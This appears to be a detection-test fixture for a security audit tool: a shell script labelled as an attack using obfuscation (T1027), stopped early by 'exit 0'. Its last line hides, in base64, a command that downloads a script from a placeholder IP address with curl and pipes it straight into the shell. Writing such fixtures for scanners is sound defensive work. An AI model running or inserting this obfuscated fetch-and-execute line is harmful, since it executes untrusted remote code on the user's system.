#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1027 | expect: critical
echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjUveCB8IHNo | base64 -d | sh
